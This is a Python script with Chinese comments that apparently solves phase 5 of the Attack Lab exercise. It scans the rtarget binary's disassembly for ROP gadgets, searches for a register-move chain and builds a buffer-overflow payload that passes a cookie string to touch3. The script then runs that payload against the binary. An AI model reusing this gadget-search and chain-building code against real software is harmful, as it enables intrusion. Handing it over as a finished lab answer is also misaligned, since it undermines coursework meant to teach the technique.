import os
import subprocess
import re
import struct
import sys
from collections import deque

# --- 配置 ---
COOKIE_FILE = "cookie.txt"
RTARGET = "./rtarget"
HEX2RAW = "./hex2raw"

# 寄存器映射
REG_NAMES = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"]
REG_RAX, REG_RCX, REG_RDX, REG_RBX, REG_RSP, REG_RBP, REG_RSI, REG_RDI = range(8)

def log(msg, color="white"):
    colors = {
        "green": "\033[92m", "red": "\033[91m", "yellow": "\033[93m",
        "blue": "\033[94m", "purple": "\033[95m", "reset": "\033[0m"
    }
    print(f"{colors.get(color, colors['reset'])}[*] {msg}{colors['reset']}")

def p64(addr): return struct.pack('<Q', addr)

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('latin-1')
    except subprocess.CalledProcessError: return ""

def get_cookie():
    try:
        with open(COOKIE_FILE, 'r') as f:
            c = f.read().strip()
            clean_c = c[2:] if c.lower().startswith("0x") else c
            return int(clean_c, 16), clean_c
    except:
        log("Error: cookie.txt not found", "red")
        sys.exit(1)

def get_symbol_addr(binary, symbol):
    out = run_command(f"objdump -t {binary} | grep ' {symbol}$'")
    m = re.search(r'([0-9a-fA-F]+)', out)
    return int(m.group(1), 16) if m else None

def get_buffer_size(binary):
    out = run_command(f"objdump -d {binary} | grep '<getbuf>:' -A 5")
    m = re.search(r'sub\s+\$0x([0-9a-fA-F]+),%rsp', out)
    return int(m.group(1), 16) if m else 40

# ==========================================
# 增强版 Gadget 分析器 (带黑名单)
# ==========================================
class GadgetFinder:
    def __init__(self, binary):
        self.bytes = [] 
        self._parse(binary)
        # 黑名单：绝对不能出现在 padding 里的字节
        # c9=leave, 5d=pop rbp, 60/61=bad, a4/a5=movs(内存副作用), cf=iret
        self.BAD_BYTES = {0x5d, 0x5f, 0x5e, 0x60, 0x61, 0xcf, 0xe8, 0xe9, 0xeb}

    def _parse(self, binary):
        log(f"Parsing {binary} segments...", "blue")
        dump = run_command(f"objdump -d {binary}")
        line_re = re.compile(r'^\s*([0-9a-f]+):\s+([0-9a-f ]+)')
        for line in dump.splitlines():
            m = line_re.match(line)
            if m:
                addr = int(m.group(1), 16)
                vals = [int(b, 16) for b in m.group(2).strip().split()]
                for i, b in enumerate(vals): self.bytes.append((addr + i, b))

    def _is_safe_padding(self, start_idx, length):
        """检查填充字节是否包含危险指令"""
        if length == 0: return True
        for k in range(length):
            b = self.bytes[start_idx + k][1]
            if b in self.BAD_BYTES:
                return False
        return True

    def find_all(self, hex_str, max_padding=3):
        """
        查找所有匹配的gadget候选，而不只是返回第一个
        返回格式: [(address, padding_length, machine_code), ...] 按padding长度排序
        """
        target = [int(x, 16) for x in hex_str.split()]
        candidates = [] # (addr, padding_len, machine_code)
        
        for i in range(len(self.bytes) - len(target)):
            # 1. 匹配目标指令
            match = True
            for k in range(len(target)):
                if self.bytes[i+k][1] != target[k]:
                    match = False; break
            
            if match:
                start_addr = self.bytes[i][0]
                # 获取机器码
                machine_code = [self.bytes[i+k][1] for k in range(len(target))]
                
                # 2. 向后找 ret (c3)，并检查 padding 安全性
                for offset in range(len(target), len(target) + 1 + max_padding):
                    if i + offset < len(self.bytes):
                        if self.bytes[i + offset][1] == 0xc3: # ret
                            pad_len = offset - len(target)
                            # 3. 检查中间的字节是否有毒
                            if self._is_safe_padding(i + len(target), pad_len):
                                # 包含padding字节的完整机器码
                                full_machine_code = machine_code + [self.bytes[i+len(target)+k][1] for k in range(pad_len)]
                                candidates.append((start_addr, pad_len, full_machine_code))
                            break
        
        # 按padding长度排序，padding越少越好
        candidates.sort(key=lambda x: x[1])
        return candidates

    def find(self, hex_str, max_padding=3):
        """
        查找最佳匹配的gadget (保持原有行为)
        """
        candidates = self.find_all(hex_str, max_padding)
        return candidates[0][0] if candidates else None

    def find_mov_r_r(self, src, dst, is_64=False):
        modrm = 0xC0 | (src << 3) | dst
        prefix = "48 89" if is_64 else "89"
        return self.find(f"{prefix} {modrm:02x}")

    def find_mov_r_r_all(self, src, dst, is_64=False):
        """
        查找所有mov寄存器到寄存器的gadget候选
        """
        modrm = 0xC0 | (src << 3) | dst
        prefix = "48 89" if is_64 else "89"
        return self.find_all(f"{prefix} {modrm:02x}")

    def find_pop(self, reg):
        return self.find(f"{0x58 + reg:02x}")

    def find_pop_all(self, reg):
        """
        查找所有pop指定寄存器的gadget候选
        """
        return self.find_all(f"{0x58 + reg:02x}")

    def find_path(self, start, end, forbidden=None):
        if forbidden is None: forbidden = set()
        queue = deque([[start]])
        visited = {start} | forbidden
        
        while queue:
            path = queue.popleft()
            curr = path[-1]
            if curr == end: return path
            for nxt in range(8):
                if nxt not in visited:
                    if self.find_mov_r_r(curr, nxt, is_64=False):
                        visited.add(nxt)
                        new_path = list(path)
                        new_path.append(nxt)
                        queue.append(new_path)
        return None

# ==========================================
# 求解逻辑
# ==========================================

def solve_phase5(finder: GadgetFinder, cookie_str, buf_size):
    log("\n[+] Solving Phase 5 (Fixed Logic)...", "purple")
    touch3 = get_symbol_addr(RTARGET, "touch3")
    
    # 1. 基础组件
    g_save_rsp_all = finder.find_all("48 89 e0") # mov %rsp, %rax
    g_rax_rdi_all = finder.find_mov_r_r_all(REG_RAX, REG_RDI, is_64=True) # mov %rax, %rdi
    g_lea_all = finder.find_all("48 8d 04 37") # lea (%rdi,%rsi,1),%rax
    
    log(f"  Found {len(g_save_rsp_all)} candidates for mov %rsp, %rax", "blue")
    for i, (addr, pad, machine_code) in enumerate(g_save_rsp_all):
        machine_code_str = " ".join([f"{b:02x}" for b in machine_code])
        log(f"    [{i}] Address: 0x{addr:x}, Padding: {pad}, Machine code: {machine_code_str}", "blue")
        
    log(f"  Found {len(g_rax_rdi_all)} candidates for mov %rax, %rdi", "blue")
    for i, (addr, pad, machine_code) in enumerate(g_rax_rdi_all):
        machine_code_str = " ".join([f"{b:02x}" for b in machine_code])
        log(f"    [{i}] Address: 0x{addr:x}, Padding: {pad}, Machine code: {machine_code_str}", "blue")
        
    log(f"  Found {len(g_lea_all)} candidates for lea (%rdi,%rsi,1),%rax", "blue")
    for i, (addr, pad, machine_code) in enumerate(g_lea_all):
        machine_code_str = " ".join([f"{b:02x}" for b in machine_code])
        log(f"    [{i}] Address: 0x{addr:x}, Padding: {pad}, Machine code: {machine_code_str}", "blue")
    
    g_save_rsp = g_save_rsp_all[0][0] if g_save_rsp_all else None
    g_rax_rdi = g_rax_rdi_all[0][0] if g_rax_rdi_all else None
    g_lea = g_lea_all[0][0] if g_lea_all else None
    
    if not (g_save_rsp and g_rax_rdi and g_lea):
        log("  [-] Missing critical gadgets (save_rsp/lea).", "red"); return None

    # 2. 寻找 Offset 传递路径 (避开 RDI)
    log("  Scanning for safe mov chain...", "blue")
    best_chain = None
    pop_gadget = None
    pop_candidates = []  # 存储所有pop gadget候选
    
    for r_start in range(8):
        g_pop_all = finder.find_pop_all(r_start)
        if not g_pop_all: continue
        
        pop_candidates.extend([(r_start, addr, pad, machine_code) for addr, pad, machine_code in g_pop_all])
        
        path = finder.find_path(r_start, REG_RSI, forbidden={REG_RDI})
        if path:
            best_chain = path
            pop_gadget = g_pop_all[0][0]  # 使用最佳候选（padding最少的）
            machine_code_str = " ".join([f"{b:02x}" for b in g_pop_all[0][2]])
            log(f"  Found chain: pop %{REG_NAMES[r_start]} -> ... -> %rsi", "green")
            log(f"  Using pop %{REG_NAMES[r_start]} gadget at address 0x{pop_gadget:x}, Machine code: {machine_code_str}", "green")
            break
            
    if not best_chain:
        log("  [-] No path found.", "red"); return None

    # 打印所有pop gadget候选
    log(f"  Found {len(pop_candidates)} pop gadget candidates:", "blue")
    for i, (reg, addr, pad, machine_code) in enumerate(pop_candidates):
        machine_code_str = " ".join([f"{b:02x}" for b in machine_code])
        log(f"    [{i}] pop %{REG_NAMES[reg]} at 0x{addr:x}, Padding: {pad}, Machine code: {machine_code_str}", "blue")

    # 3. 收集 Chain Gadgets
    chain_gadgets = []
    chain_gadgets_all = []  # 存储所有链中mov指令的候选
    for i in range(len(best_chain) - 1):
        mov_candidates = finder.find_mov_r_r_all(best_chain[i], best_chain[i+1], is_64=False)
        chain_gadgets_all.append(mov_candidates)
        if mov_candidates:
            chain_gadgets.append(mov_candidates[0][0])  # 使用最佳候选
    
    # 打印链中所有mov指令的候选
    for i, mov_candidates in enumerate(chain_gadgets_all):
        src_reg = best_chain[i]
        dst_reg = best_chain[i+1]
        log(f"  Found {len(mov_candidates)} candidates for mov %{REG_NAMES[src_reg]}, %{REG_NAMES[dst_reg]}:", "blue")
        for j, (addr, pad, machine_code) in enumerate(mov_candidates):
            machine_code_str = " ".join([f"{b:02x}" for b in machine_code])
            log(f"    [{j}] Address: 0x{addr:x}, Padding: {pad}, Machine code: {machine_code_str}", "blue")
            
        # 显示实际使用的gadget
        if mov_candidates:
            machine_code_str = " ".join([f"{b:02x}" for b in mov_candidates[0][2]])
            log(f"  Using mov %{REG_NAMES[src_reg]}, %{REG_NAMES[dst_reg]} gadget at address 0x{mov_candidates[0][0]:x}, Machine code: {machine_code_str}", "green")

    # 4. 精确计算 Offset (修复版)
    # Stack layout from 'mov %rax, %rdi' (Base Pointer):
    # +00: [Gadget: mov rax, rdi] <-- RDI 指向这里
    # +08: [Gadget: pop r_start]
    # +16: [DATA: Offset Value]   <-- pop 出来的值
    # +24: [Gadget: mov 1]
    # ...
    # +XX: [Gadget: lea]
    # +XX: [Gadget: mov rax, rdi]
    # +XX: [Address: touch3]
    # +XX: [STRING]               <-- 我们要计算到这里的距离
    
    # 距离 = (pop + data + movs_len + lea + mov_back + touch3) * 8
    # 基础槽位: pop(1) + data(1) + lea(1) + mov_back(1) + touch3(1) = 5
    
    slots = 5 + len(chain_gadgets)
    offset_val = (slots+1) * 8
    
    log(f"  Calculated Offset: {offset_val} (0x{offset_val:x})", "green")
    if offset_val == 0x30:
        log("  (Warning: 0x30 implies a very short chain. If standard answer is 0x48, verify if extra padding is needed)", "yellow")

    # 5. 构建 Payload
    p = b'A' * buf_size
    p += p64(g_save_rsp)
    p += p64(g_rax_rdi)
    p += p64(pop_gadget)
    p += p64(offset_val)
    for g in chain_gadgets:
        p += p64(g)
    p += p64(g_lea)
    p += p64(g_rax_rdi)
    p += p64(touch3)
    p += cookie_str.encode() + b'\x00'
    
    return p

# ==========================================
# Main
# ==========================================
if __name__ == "__main__":
    cookie_int, cookie_str = get_cookie()
    buf_size = get_buffer_size(RTARGET)
    finder = GadgetFinder(RTARGET)
    
    # 这里只跑 Phase 5，Phase 4 逻辑通常比较简单
    p5 = solve_phase5(finder, cookie_str, buf_size)
    if p5:
        with open("5.txt", "w") as f: f.write(" ".join([f"{b:02x}" for b in p5]))
        log("Generated 5.txt", "blue")
        os.system(f"{HEX2RAW} < 5.txt | {RTARGET} -q")